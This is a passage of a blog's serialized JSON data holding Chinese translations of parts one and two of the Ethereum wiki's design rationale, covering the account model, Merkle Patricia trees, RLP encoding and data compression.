类型来花费，并且需要花费包括根据脚本评估的 `Merkle` 树中的应用程序状态改变的证明的 `Merkle` 树的根（and requiring spends to include Merkle tree proofs of change-of-application-state-root that scripts evaluate），这样的范例比使用帐户更加复杂和难看。\n4. **持久的轻客户端引用**：轻客户端可以在任何时候通过定向扫描一棵状态树来访问一个账户相关的所有数据。在 `UTXO` 模型中，每笔交易都会改变引用，这对于试图使用上面提到的 `UTXO` 状态传播机制的长期运行的 `dapps` 来说，这是一个特别麻烦的问题。\n\n我们已经做好了决定，因为对于我们正在处理的包含任意状态和代码的 `dapps` 来说，帐户模型远比其他要好。 此外，本着“我们没有特征”原则的精神，我们认为，如果人们确实关心隐私，那么可以通过合同内的签名数据包协议来建立混淆器（mixer）和组合币（coinjoin）。\n\n账户模型的一个缺点是，为了防止重放攻击，每笔交易都必须有一个 `nonce` 值，这样账户就可以对使用的 `nonce` 进行跟踪，并且只接受当前 `nonce` 值比之前的 `nonce` 值多 1 的交易。这意味着即使是废弃的账号也不会删除账号状态。解决这个问题的一个简单方法是要求每笔交易都包含一个区块号，使得它们在一段时期之后就不能够被重放，并且在每个时期都重置一次 `nonce`。矿工或者其他用户会对账户进行 `ping` 操作，然后删除状态中的未使用账户，因为作为区块链协议的一部分，进行全部扫描的代价太高了。我们没有用这个机制只是为了加快 `1.0` 的发展; `1.1` 及以后可能会使用这样一个系统。\n","slug":"以太坊wiki-设计原理翻译一","published":1,"updated":"2018-03-09T09:32:59.581Z","layout":"post","photos":[],"link":"","_id":"cjf7piavc000lpkwo7ryicz85","content":"<h2 id=\"设计原理原文链接\"><a href=\"#设计原理原文链接\" class=\"headerlink\" title=\"设计原理原文链接\"></a><a href=\"https://github.com/ethereum/wiki/wiki/Design-Rationale\" target=\"_blank\" rel=\"noopener\">设计原理原文链接</a></h2><p>尽管以太坊借鉴了许多已经在比特币这样的老式加密货币中经过了5年的尝试和测试的想法，但是以太坊在处理某些协议特征方面与常见方式有很多不同之处，因为目前现存的系统中没有以太坊需要的功能，所以以太坊另外开发了全新的功能。本文档的目的是详细说明在制定以太坊协议过程中所做出的所有可能不明显的或有些有争议的决定，以及显示我们的方法和可能的替代方案所涉及的风险。</p>\n<h2 id=\"原则\"><a href=\"#原则\" class=\"headerlink\" title=\"原则\"></a>原则</h2><p>以太坊协议的设计过程遵循了下列原则：</p>\n<ol>\n<li><p><strong>三明治复杂模型</strong>：我们相信以太坊结构的底层应该尽可能的简单，并且与以太坊的交互接口（包括开发者使用的高级编程语言以及用户的使用界面）应该尽可能的易懂。在复杂性不可避免的情况下，它应该被推入协议的“中间层”，它们不是核心共识的一部分，但也不被终端用户看到，如高级语言编译器，参数序列化和反序列化脚本，存储 数据结构模型，<code>leveldb</code>存储接口和有线协议等。但是，这种偏好并不是绝对的。</p>\n</li>\n<li><p><strong>自由</strong>：用户在使用以太坊协议的时候不应该被限制，我们也不应该试图去表示喜欢或者不喜欢他们基于某种目的而使用的以太坊合约或者交易。这类似于和“网络中立”背后的指导原则。一个没有遵循此原则的例子是比特币交易协议中的情况，它不鼓励使用区块链来做“非标签”（如数据存储，元协议）目的的行为，并且在某些情况下明确了对准协议的改变（如 <code>OP_RETURN</code> 限制为 40 字节），试图以“未授权”方式使用区块链来攻击应用。在 <code>Ethereum</code> 中，我们强烈支持设置交易费用，这样大致上就会具有激励作用，这样，使用区块链的用户会以膨胀（<code>bloat-producing</code>）的方式内部化其活动成本（即 <code>Pigovian</code> 税）。</p>\n</li>\n<li><p><strong>概念</strong>：以太坊中的协议特征和操作码应该体现最低级别的概念，以便可以以任意的方式进行组合，包括今天可能看起来不太有用但以后可能会变得有用的方法，然后当这些概念对于使用了这些概念的功能来说不再必要的时候，就可以通过剥离它们来提升效率。遵循这个原则的一个例子是我们选择 <code>LOG</code> 操作码作为向（特别是轻客户端）<code>dapps</code> 提供信息的一种方式，而不是像之前建议的那样在内部简单地记录所有事务和消息 - “消息”的概念是包括“方法调用”和“外部观察者感兴趣的事件”在内的多个概念的聚集，理应分离这两个概念。</p>\n</li>\n<li><p><strong>我们没有特征</strong>：作为泛化的必然结果，我们常常拒绝将十分常见的高级使用示例作为协议的一部分，我们认为如果人们真的需要做一件事情，那么他可以在一个合约内部创建一个子协议。一个例子是以太坊中缺少与比特币中一样“锁定时间”的功能，因为这样的功能可以通过用户发送“签名数据包”协议来模拟，然后这些数据包可以被输入到专门的合同中处理，并且如果数据包符合合同的一些条件，就会触发相应的功能。</p>\n</li>\n<li><p><strong>非风险规避</strong>：如果风险增加的变化提供了非常可观的收益（例如，广义的状态转换，50倍的更快的阻塞时间，共识效率等），那么我们可以承受更高的风险程度。</p>\n</li>\n</ol>\n<p>这些原则在规定以太坊开发中都涉及到，但它们并不是绝对的，在某些情况下，为了减少开发时间或者避免一次性尝试太多激进的东西，我们会推迟某些明显有利的变革，以便将来发行（如以太坊1.1）。</p>\n<h2 id=\"区块链层次的协议\"><a href=\"#区块链层次的协议\" class=\"headerlink\" title=\"区块链层次的协议\"></a>区块链层次的协议</h2><p>这部分描述了以太坊中对区块链层次协议所做的一些改变，包括了区块和交易是如何工作的，数据是如何序列化和存储的，以及账户背后的机制。</p>\n<h3 id=\"账户和非-UTXOs\"><a href=\"#账户和非-UTXOs\" class=\"headerlink\" title=\"账户和非 UTXOs\"></a>账户和非 <code>UTXOs</code></h3><p>比特币，以及许多由它衍生而来的系统，将用户的资产数据存储在一个基于 <code>unspent transaction outputs(UTXOs)</code> 的结构中：整个系统的状态由一系列未花费输出（联想成“币”）组成，所以每个币都有一个主人和面值，而一笔交易可以花费一个或更多的币并且创建一个或更多的币，有效性的约束有：</p>\n<ol>\n<li>每一个被引用的输入必须是合法的并且没有被花费过</li>\n<li>交易中的每一个输入都必须有一个符合该输入的主人的签名</li>\n<li>所有的输入必须大于等于所有的输出</li>\n</ol>\n<p>因此，系统中用户的“余额”是用户具有能够产生有效签名的私钥的一组硬币的总值。</p>\n<p><img src=\"https://bitcoin.org/img/dev/en-transaction-propagation.svg\" alt=\"\"></p>\n<p>(图片来自 <code>https://bitcoin.org/en/developer-guide</code>)</p>\n<p>以太坊抛弃这个方案，转而采用更简单的方法：使用状态存储一个账户列表，其中每个账户都有一个余额，以及以太坊特定的数据（代码和内部存储）。一笔交易会在发送账户有足够的余额支付的情况下生效，此时，发送账户减少余额，收款账户增加余额。如果接收账户有代码，代码会运行，而内部存储也可能被更改，或者代码甚至可能会创建额外的消息给其他账户，从而导致进一步的余额变更。</p>\n<p><code>UTXOs</code> 的好处：</p>\n<ol>\n<li><strong>高度的隐私性</strong>：如果用户接受每笔交易的时候都使用一个新地址，那么就很难将账户连接起来。这很适用于货币，但是对任意 <code>dapps</code> 就不是那么合适了，因为 <code>dapps</code> 常常需要对用户的一系列复杂的状态保持跟踪，并且可能不存在像货币那样简单的用户状态分区方案。</li>\n<li><strong>潜在的可扩展性范例</strong>：<code>UTXO</code> 在理论上更与某些可扩展性模式相兼容，因为我们只能依靠一些拥有 <code>Merkle</code> 所有权证明的币的所有者，即使包括所有者在内的每个人都决定忘记这些数据，只有所有者受到损害( and even if everyone including the owner decides to forget that data then only the owner is harmed)。 在一个账户范例中，一旦某个人失去其账户对应的部分 <code>Merkle</code> 树，将使得不可能以任何方式处理该账户相关的消息，包括发送给它。 但是，非 <code>UTXO</code> 依赖的可伸缩性范例确实存在。</li>\n</ol>\n<p>账户的好处：</p>\n<ol>\n<li><strong>节省了大量空间</strong>：例如，如果一个账户有 5 个 <code>UTXO</code>，然后将一个 <code>UTXO</code> 模型转换成账户模型，它的空间要求就会从 （20 + 32 + 8）* 5 = 300 bytes(20 是地址，32 是 <code>txid</code>，8 是值)减少到 20 + 8 + 2 = 30 bytes(20 是地址，8 是值，2 是 <code>nonce</code>)。实际上，要求的存储空间没有这么大，因为账户需要存储在 <code>Patricia</code> 树中（见下文），但是它们仍然很大。（In reality savings are not nearly this massive because accounts need to be stored in a Patricia tree (see below) but they are nevertheless large. ）另外，交易可以更小（如以太坊中需要 100 bytes 而比特币中需要 200 - 250 bytes），因为每笔交易只需要使用一个引用，一个签名以及一个输出。</li>\n<li><strong>更好的可替代性</strong>：因为没有区块链层次的特定币来源的概念，所以从技术上和法律上来说，建立一个红名单/黑名单方案并根据它们的来源来区分币就很不现实。</li>\n<li><strong>简单</strong>：编码简单易懂，特别是涉及到复杂脚本的时候。虽然也可以强制使用 <code>UTXO</code> 模型来实现 <code>dapp</code>，但本质上是通过赋予脚本能力，来限制给定的 <code>UTXO</code> 可以以哪种 <code>UTXO</code> 类型来花费，并且需要花费包括根据脚本评估的 <code>Merkle</code> 树中的应用程序状态改变的证明的 <code>Merkle</code> 树的根（and requiring spends to include Merkle tree proofs of change-of-application-state-root that scripts evaluate），这样的范例比使用帐户更加复杂和难看。</li>\n<li><strong>持久的轻客户端引用</strong>：轻客户端可以在任何时候通过定向扫描一棵状态树来访问一个账户相关的所有数据。在 <code>UTXO</code> 模型中，每笔交易都会改变引用，这对于试图使用上面提到的 <code>UTXO</code> 状态传播机制的长期运行的 <code>dapps</code> 来说，这是一个特别麻烦的问题。</li>\n</ol>\n<p>我们已经做好了决定，因为对于我们正在处理的包含任意状态和代码的 <code>dapps</code> 来说，帐户模型远比其他要好。 此外，本着“我们没有特征”原则的精神，我们认为，如果人们确实关心隐私，那么可以通过合同内的签名数据包协议来建立混淆器（mixer）和组合币（coinjoin）。</p>\n<p>账户模型的一个缺点是，为了防止重放攻击，每笔交易都必须有一个 <code>nonce</code> 值，这样账户就可以对使用的 <code>nonce</code> 进行跟踪，并且只接受当前 <code>nonce</code> 值比之前的 <code>nonce</code> 值多 1 的交易。这意味着即使是废弃的账号也不会删除账号状态。解决这个问题的一个简单方法是要求每笔交易都包含一个区块号，使得它们在一段时期之后就不能够被重放，并且在每个时期都重置一次 <code>nonce</code>。矿工或者其他用户会对账户进行 <code>ping</code> 操作，然后删除状态中的未使用账户，因为作为区块链协议的一部分，进行全部扫描的代价太高了。我们没有用这个机制只是为了加快 <code>1.0</code> 的发展; <code>1.1</code> 及以后可能会使用这样一个系统。</p>\n","site":{"data":{}},"excerpt":"","more":"<h2 id=\"设计原理原文链接\"><a href=\"#设计原理原文链接\" class=\"headerlink\" title=\"设计原理原文链接\"></a><a href=\"https://github.com/ethereum/wiki/wiki/Design-Rationale\" target=\"_blank\" rel=\"noopener\">设计原理原文链接</a></h2><p>尽管以太坊借鉴了许多已经在比特币这样的老式加密货币中经过了5年的尝试和测试的想法，但是以太坊在处理某些协议特征方面与常见方式有很多不同之处，因为目前现存的系统中没有以太坊需要的功能，所以以太坊另外开发了全新的功能。本文档的目的是详细说明在制定以太坊协议过程中所做出的所有可能不明显的或有些有争议的决定，以及显示我们的方法和可能的替代方案所涉及的风险。</p>\n<h2 id=\"原则\"><a href=\"#原则\" class=\"headerlink\" title=\"原则\"></a>原则</h2><p>以太坊协议的设计过程遵循了下列原则：</p>\n<ol>\n<li><p><strong>三明治复杂模型</strong>：我们相信以太坊结构的底层应该尽可能的简单，并且与以太坊的交互接口（包括开发者使用的高级编程语言以及用户的使用界面）应该尽可能的易懂。在复杂性不可避免的情况下，它应该被推入协议的“中间层”，它们不是核心共识的一部分，但也不被终端用户看到，如高级语言编译器，参数序列化和反序列化脚本，存储 数据结构模型，<code>leveldb</code>存储接口和有线协议等。但是，这种偏好并不是绝对的。</p>\n</li>\n<li><p><strong>自由</strong>：用户在使用以太坊协议的时候不应该被限制，我们也不应该试图去表示喜欢或者不喜欢他们基于某种目的而使用的以太坊合约或者交易。这类似于和“网络中立”背后的指导原则。一个没有遵循此原则的例子是比特币交易协议中的情况，它不鼓励使用区块链来做“非标签”（如数据存储，元协议）目的的行为，并且在某些情况下明确了对准协议的改变（如 <code>OP_RETURN</code> 限制为 40 字节），试图以“未授权”方式使用区块链来攻击应用。在 <code>Ethereum</code> 中，我们强烈支持设置交易费用，这样大致上就会具有激励作用，这样，使用区块链的用户会以膨胀（<code>bloat-producing</code>）的方式内部化其活动成本（即 <code>Pigovian</code> 税）。</p>\n</li>\n<li><p><strong>概念</strong>：以太坊中的协议特征和操作码应该体现最低级别的概念，以便可以以任意的方式进行组合，包括今天可能看起来不太有用但以后可能会变得有用的方法，然后当这些概念对于使用了这些概念的功能来说不再必要的时候，就可以通过剥离它们来提升效率。遵循这个原则的一个例子是我们选择 <code>LOG</code> 操作码作为向（特别是轻客户端）<code>dapps</code> 提供信息的一种方式，而不是像之前建议的那样在内部简单地记录所有事务和消息 - “消息”的概念是包括“方法调用”和“外部观察者感兴趣的事件”在内的多个概念的聚集，理应分离这两个概念。</p>\n</li>\n<li><p><strong>我们没有特征</strong>：作为泛化的必然结果，我们常常拒绝将十分常见的高级使用示例作为协议的一部分，我们认为如果人们真的需要做一件事情，那么他可以在一个合约内部创建一个子协议。一个例子是以太坊中缺少与比特币中一样“锁定时间”的功能，因为这样的功能可以通过用户发送“签名数据包”协议来模拟，然后这些数据包可以被输入到专门的合同中处理，并且如果数据包符合合同的一些条件，就会触发相应的功能。</p>\n</li>\n<li><p><strong>非风险规避</strong>：如果风险增加的变化提供了非常可观的收益（例如，广义的状态转换，50倍的更快的阻塞时间，共识效率等），那么我们可以承受更高的风险程度。</p>\n</li>\n</ol>\n<p>这些原则在规定以太坊开发中都涉及到，但它们并不是绝对的，在某些情况下，为了减少开发时间或者避免一次性尝试太多激进的东西，我们会推迟某些明显有利的变革，以便将来发行（如以太坊1.1）。</p>\n<h2 id=\"区块链层次的协议\"><a href=\"#区块链层次的协议\" class=\"headerlink\" title=\"区块链层次的协议\"></a>区块链层次的协议</h2><p>这部分描述了以太坊中对区块链层次协议所做的一些改变，包括了区块和交易是如何工作的，数据是如何序列化和存储的，以及账户背后的机制。</p>\n<h3 id=\"账户和非-UTXOs\"><a href=\"#账户和非-UTXOs\" class=\"headerlink\" title=\"账户和非 UTXOs\"></a>账户和非 <code>UTXOs</code></h3><p>比特币，以及许多由它衍生而来的系统，将用户的资产数据存储在一个基于 <code>unspent transaction outputs(UTXOs)</code> 的结构中：整个系统的状态由一系列未花费输出（联想成“币”）组成，所以每个币都有一个主人和面值，而一笔交易可以花费一个或更多的币并且创建一个或更多的币，有效性的约束有：</p>\n<ol>\n<li>每一个被引用的输入必须是合法的并且没有被花费过</li>\n<li>交易中的每一个输入都必须有一个符合该输入的主人的签名</li>\n<li>所有的输入必须大于等于所有的输出</li>\n</ol>\n<p>因此，系统中用户的“余额”是用户具有能够产生有效签名的私钥的一组硬币的总值。</p>\n<p><img src=\"https://bitcoin.org/img/dev/en-transaction-propagation.svg\" alt=\"\"></p>\n<p>(图片来自 <code>https://bitcoin.org/en/developer-guide</code>)</p>\n<p>以太坊抛弃这个方案，转而采用更简单的方法：使用状态存储一个账户列表，其中每个账户都有一个余额，以及以太坊特定的数据（代码和内部存储）。一笔交易会在发送账户有足够的余额支付的情况下生效，此时，发送账户减少余额，收款账户增加余额。如果接收账户有代码，代码会运行，而内部存储也可能被更改，或者代码甚至可能会创建额外的消息给其他账户，从而导致进一步的余额变更。</p>\n<p><code>UTXOs</code> 的好处：</p>\n<ol>\n<li><strong>高度的隐私性</strong>：如果用户接受每笔交易的时候都使用一个新地址，那么就很难将账户连接起来。这很适用于货币，但是对任意 <code>dapps</code> 就不是那么合适了，因为 <code>dapps</code> 常常需要对用户的一系列复杂的状态保持跟踪，并且可能不存在像货币那样简单的用户状态分区方案。</li>\n<li><strong>潜在的可扩展性范例</strong>：<code>UTXO</code> 在理论上更与某些可扩展性模式相兼容，因为我们只能依靠一些拥有 <code>Merkle</code> 所有权证明的币的所有者，即使包括所有者在内的每个人都决定忘记这些数据，只有所有者受到损害( and even if everyone including the owner decides to forget that data then only the owner is harmed)。 在一个账户范例中，一旦某个人失去其账户对应的部分 <code>Merkle</code> 树，将使得不可能以任何方式处理该账户相关的消息，包括发送给它。 但是，非 <code>UTXO</code> 依赖的可伸缩性范例确实存在。</li>\n</ol>\n<p>账户的好处：</p>\n<ol>\n<li><strong>节省了大量空间</strong>：例如，如果一个账户有 5 个 <code>UTXO</code>，然后将一个 <code>UTXO</code> 模型转换成账户模型，它的空间要求就会从 （20 + 32 + 8）* 5 = 300 bytes(20 是地址，32 是 <code>txid</code>，8 是值)减少到 20 + 8 + 2 = 30 bytes(20 是地址，8 是值，2 是 <code>nonce</code>)。实际上，要求的存储空间没有这么大，因为账户需要存储在 <code>Patricia</code> 树中（见下文），但是它们仍然很大。（In reality savings are not nearly this massive because accounts need to be stored in a Patricia tree (see below) but they are nevertheless large. ）另外，交易可以更小（如以太坊中需要 100 bytes 而比特币中需要 200 - 250 bytes），因为每笔交易只需要使用一个引用，一个签名以及一个输出。</li>\n<li><strong>更好的可替代性</strong>：因为没有区块链层次的特定币来源的概念，所以从技术上和法律上来说，建立一个红名单/黑名单方案并根据它们的来源来区分币就很不现实。</li>\n<li><strong>简单</strong>：编码简单易懂，特别是涉及到复杂脚本的时候。虽然也可以强制使用 <code>UTXO</code> 模型来实现 <code>dapp</code>，但本质上是通过赋予脚本能力，来限制给定的 <code>UTXO</code> 可以以哪种 <code>UTXO</code> 类型来花费，并且需要花费包括根据脚本评估的 <code>Merkle</code> 树中的应用程序状态改变的证明的 <code>Merkle</code> 树的根（and requiring spends to include Merkle tree proofs of change-of-application-state-root that scripts evaluate），这样的范例比使用帐户更加复杂和难看。</li>\n<li><strong>持久的轻客户端引用</strong>：轻客户端可以在任何时候通过定向扫描一棵状态树来访问一个账户相关的所有数据。在 <code>UTXO</code> 模型中，每笔交易都会改变引用，这对于试图使用上面提到的 <code>UTXO</code> 状态传播机制的长期运行的 <code>dapps</code> 来说，这是一个特别麻烦的问题。</li>\n</ol>\n<p>我们已经做好了决定，因为对于我们正在处理的包含任意状态和代码的 <code>dapps</code> 来说，帐户模型远比其他要好。 此外，本着“我们没有特征”原则的精神，我们认为，如果人们确实关心隐私，那么可以通过合同内的签名数据包协议来建立混淆器（mixer）和组合币（coinjoin）。</p>\n<p>账户模型的一个缺点是，为了防止重放攻击，每笔交易都必须有一个 <code>nonce</code> 值，这样账户就可以对使用的 <code>nonce</code> 进行跟踪，并且只接受当前 <code>nonce</code> 值比之前的 <code>nonce</code> 值多 1 的交易。这意味着即使是废弃的账号也不会删除账号状态。解决这个问题的一个简单方法是要求每笔交易都包含一个区块号，使得它们在一段时期之后就不能够被重放，并且在每个时期都重置一次 <code>nonce</code>。矿工或者其他用户会对账户进行 <code>ping</code> 操作，然后删除状态中的未使用账户，因为作为区块链协议的一部分，进行全部扫描的代价太高了。我们没有用这个机制只是为了加快 <code>1.0</code> 的发展; <code>1.1</code> 及以后可能会使用这样一个系统。</p>\n"},{"title":"以太坊wiki-设计原理翻译二","comments":0,"date":"2018-02-08T18:10:31.000Z","img":null,"_content":"\n[以太坊wiki-设计原理翻译一](https://xingyunbite.github.io/2018/02/09/%E4%BB%A5%E5%A4%AA%E5%9D%8Awiki-%E8%AE%BE%E8%AE%A1%E5%8E%9F%E7%90%86%E7%BF%BB%E8%AF%91%E4%B8%80/)\n\n## 默克尔帕夏里克树\n\n默克尔帕夏里克树（`Merkle Patricia tree/trie`），以前由 Alan Reiner 设想并在 Ripple 协议中实现，是以太坊中的基本数据结构，被用来存储所有的账户状态，以及区块中的交易和收据。`MPT` 是 `Merkle tree` 和 `Patricia tree` 的结合，以两者的元素来创建具有以下两个属性的结构：\n\n1. 每一组唯一的键/值对唯一地映射到一个根散列，并且不可能欺骗一棵树中的键/值对的成员（除非攻击者具有〜2 ^ 128 的计算能力）\n2. 在对数时间内进行修改，添加和删除键值对。\n\n这为我们提供了一种高效、更新容易的方法，来对我们整个状态树进行“指纹”操作。以太坊 `MPT` 的正式描述如下：[https://github.com/ethereum/wiki/wiki/Patricia-Tree](https://github.com/ethereum/wiki/wiki/Patricia-Tree)\n\n`MPT` 中详细的设计决定包括：\n\n1. **拥有两种节点类别**：`kv` 节点和分叉节点（从 `MPT` 详解中获得更多信息）。`kv` 节点的存在提高了效率，因为如果一棵树在特定区域稀疏，`kv` 节点就可以作为“快捷方式”，从而不需要深度为 64 的树。\n2. **使分叉节点为 6 而不是 2**：这是为了提升查找效率。我们现在认识到这个选择并不理想，因为可以通过存储批量节点，以二进制模式模拟六叉树的查找效率。然而，由于树结构在实现中很容易出现错误，而导致根不匹配，所以我们决定把它推迟到 `1.1`。\n3. **空值和“没有成员”之间没有区别**：这是为了简单起见，并且因为以太坊的默认值通常意味着零（如 余额（balance）），而且空字符串被用来表示零，所以实际运行起来也没有任何问题。\n4. **终止和非终止节点之间的区别**：从技术上讲，“这个节点终止”标志是不必要的，因为以太坊中的所有树都用来存储静态键长度，但是为了增加通用性，我们添加了它，并且希望其他加密协议也能够使用以太坊中 `MPT` 的实现方式。\n5. **使用 `sha3(k)` 作为 “安全树（secure tree）” 中的键（在状态和账户存储中使用）**：这会使得「通过设置一个分叉了 64 层级深的节点的最大不利链，然后在这上面不断调用 `SLOAD` 和 `SSTORE`」这样的方式，对树进行 `DoS` 攻击会十分困难。同时请注意，这将使枚举树更加困难。 如果你想在你的客户端拥有枚举功能，最简单的方法是维护一个数据库映射 `sha3（k） - > k`。\n\n## RLP\n\n`RLP`（递归长度前缀）编码是以太坊中使用的主要序列化格式，并且被使用于任何地方 - 区块，交易，账户状态和信息传递协议。`RLP` 的正式描述如下：[https://github.com/ethereum/wiki/wiki/RLP](https://github.com/ethereum/wiki/wiki/RLP)\n\n`RLP` 旨在成为高度简约的序列化格式，它唯一的目的是存储嵌套的字节数组。不像 [`protobuf`](https://developers.google.com/protocol-buffers/docs/pythontutorial)，[`BSON`](http://bsonspec.org/) 和其他解决方式，`RLP` 并不想定义任何具体的数据类型，如 `booleans, floats, doubles` 或者 `integers`，相反，它只是以嵌套数组的形式存储结构，并将其留给协议来确定数组的含义。键/值映射也不被明确支持; 支持键/值映射的半官方建议是将这些映射表示为`[[k1，v1]，[k2，v2]，...]`，其中 `k1，k2 ...` 使用字符串的标准排序来排序。\n\n`RLP` 的备选方案可以使用已经存在的算法如 `protobuf` 或者 `BSON`，但我们更青睐 `RLP` 的原因是：(1) 实现方式简单。（2）保证绝对的字节完美一致性。许多语言中的键/值映射没有明确的顺序，浮点格式有许多特殊情况，这可能导致相同的数据使用不同的编码，因此产生不同的哈希。我们可以内部开发一个协议来确定解决这些问题（这是一个普遍的原则，也适用于代码的其他部分，例如 `VM`）。注意 `BitTorrent` 使用的 `bencode`，可能为 `RLP` 提供了一个可行的替代方案，尽管其使用十进制编码的长度使得它与二进制 `RLP` 相比稍微不太理想。\n\n## 压缩算法\n\n有线协议和数据库都使用了定制的压缩算法来存储数据。该算法最好的描述为运行长度编码零（`run-length-encoding zeroes`），并保留其他值，除了像 `sha3（''）` 这样的常见值的一些特殊情况例外。例如：\n\n```\n>>> compress('horse')\n'horse'\n>>> compress('donkey dragon 1231231243')\n'donkey dragon 1231231243'\n>>> compress('\\xf8\\xaf\\xf8\\xab\\xa0\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xbe{b\\xd5\\xcd\\x8d\\x87\\x97')\n'\\xf8\\xaf\\xf8\\xab\\xa0\\xfe\\x9e\\xbe{b\\xd5\\xcd\\x8d\\x87\\x97'\n>>> compress(\"\\xc5\\xd2F\\x01\\x86\\xf7#<\\x92~}\\xb2\\xdc\\xc7\\x03\\xc0\\xe5\\x00\\xb6S\\xca\\x82';{\\xfa\\xd8\\x04]\\x85\\xa4p\")'\\xfe\\x01'\n\t\t\t```\n\n在压缩算法出现之前，以太坊协议中的很多部分都有大量的特殊情况。比如，`sha3` 常常被覆盖，这样 `sha3('')=''`，从而无需存储代码或者在账户中存储，由此会节省 64 个字节。但是，最近所有的这些特殊情况都被移除了 - 这使得以太坊数据结构在默认情况下变得非常庞大，取而代之的是将数据保存功能添加到区块链协议层之外的层级，添加方式是将其利用有线协议无缝插入用户的数据库实现。 这增加了模块性，简化了共识层，并且还允许相对容易地部署压缩算法的升级（例如，通过网络协议版本）。\n","source":"_posts/以太坊wiki-设计原理翻译二.md","raw":"---\ntitle: 以太坊wiki-设计原理翻译二\ncomments: false\ndate: 2018-02-09 02:10:31\ncategories: 区块链\ntags: \n- ZhouFyk \n- 区块链 \n- 以太坊 \n- ethereum\nimg:\n---\n\n[以太坊wiki-设计原理翻译一](https://xingyunbite.github.io/2018/02/09/%E4%BB%A5%E5%A4%AA%E5%9D%8Awiki-%E8%AE%BE%E8%AE%A1%E5%8E%9F%E7%90%86%E7%BF%BB%E8%AF%91%E4%B8%80/)\n\n## 默克尔帕夏里克树\n\n默克尔帕夏里克树（`Merkle Patricia tree/trie`），以前由 Alan Reiner 设想并在 Ripple 协议中实现，是以太坊中的基本数据结构，被用来存储所有的账户状态，以及区块中的交易和收据。`MPT` 是 `Merkle tree` 和 `Patricia tree` 的结合，以两者的元素来创建具有以下两个属性的结构：\n\n1. 每一组唯一的键/值对唯一地映射到一个根散列，并且不可能欺骗一棵树中的键/值对的成员（除非攻击者具有〜2 ^ 128 的计算能力）\n2. 在对数时间内进行修改，添加和删除键值对。\n\n这为我们提供了一种高效、更新容易的方法，来对我们整个状态树进行“指纹”操作。以太坊 `MPT` 的正式描述如下：[https://github.com/ethereum/wiki/wiki/Patricia-Tree](https://github.com/ethereum/wiki/wiki/Patricia-Tree)\n\n`MPT` 中详细的设计决定包括：\n\n1. **拥有两种节点类别**：`kv` 节点和分叉节点（从 `MPT` 详解中获得更多信息）。`kv` 节点的存在提高了效率，因为如果一棵树在特定区域稀疏，`kv` 节点就可以作为“快捷方式”，从而不需要深度为 64 的树。\n2. **使分叉节点为 6 而不是 2**：这是为了提升查找效率。我们现在认识到这个选择并不理想，因为可以通过存储批量节点，以二进制模式模拟六叉树的查找效率。然而，由于树结构在实现中很容易出现错误，而导致根不匹配，所以我们决定把它推迟到 `1.1`。\n3. **空值和“没有成员”之间没有区别**：这是为了简单起见，并且因为以太坊的默认值通常意味着零（如 余额（balance）），而且空字符串被用来表示零，所以实际运行起来也没有任何问题。\n4. **终止和非终止节点之间的区别**：从技术上讲，“这个节点终止”标志是不必要的，因为以太坊中的所有树都用来存储静态键长度，但是为了增加通用性，我们添加了它，并且希望其他加密协议也能够使用以太坊中 `MPT` 的实现方式。\n5. **使用 `sha3(k)` 作为 “安全树（secure tree）” 中的键（在状态和账户存储中使用）**：这会使得「通过设置一个分叉了 64 层级深的节点的最大不利链，然后在这上面不断调用 `SLOAD` 和 `SSTORE`」这样的方式，对树进行 `DoS` 攻击会十分困难。同时请注意，这将使枚举树更加困难。 如果你想在你的客户端拥有枚举功能，最简单的方法是维护一个数据库映射 `sha3（k） - > k`。\n\n## RLP\n\n`RLP`（递归长度前缀）编码是以太坊中使用的主要序列化格式，并且被使用于任何地方 - 区块，交易，账户状态和信息传递协议。`RLP` 的正式描述如下：[https://github.com/ethereum/wiki/wiki/RLP](https://github.com/ethereum/wiki/wiki/RLP)\n\n`RLP` 旨在成为高度简约的序列化格式，它唯一的目的是存储嵌套的字节数组。不像 [`protobuf`](https://developers.google.com/protocol-buffers/docs/pythontutorial)，[`BSON`](http://bsonspec.org/) 和其他解决方式，`RLP` 并不想定义任何具体的数据类型，如 `booleans, floats, doubles` 或者 `integers`，相反，它只是以嵌套数组的形式存储结构，并将其留给协议来确定数组的含义。键/值映射也不被明确支持; 支持键/值映射的半官方建议是将这些映射表示为`[[k1，v1]，[k2，v2]，...]`，其中 `k1，k2 ...` 使用字符串的标准排序来排序。\n\n`RLP` 的备选方案可以使用已经存在的算法如 `protobuf` 或者 `BSON`，但我们更青睐 `RLP` 的原因是：(1) 实现方式简单。（2）保证绝对的字节完美一致性。许多语言中的键/值映射没有明确的顺序，浮点格式有许多特殊情况，这可能导致相同的数据使用不同的编码，因此产生不同的哈希。我们可以内部开发一个协议来确定解决这些问题（这是一个普遍的原则，也适用于代码的其他部分，例如 `VM`）。注意 `BitTorrent` 使用的 `bencode`，可能为 `RLP` 提供了一个可行的替代方案，尽管其使用十进制编码的长度使得它与二进制 `RLP` 相比稍微不太理想。\n\n## 压缩算法\n\n有线协议和数据库都使用了定制的压缩算法来存储数据。该算法最好的描述为运行长度编码零（`run-length-encoding zeroes`），并保留其他值，除了像 `sha3（''）` 这样的常见值的一些特殊情况例外。例如：\n\n```\n>>> compress('horse')\n'horse'\n>>> compress('donkey dragon 1231231243')\n'donkey dragon 1231231243'\n>>> 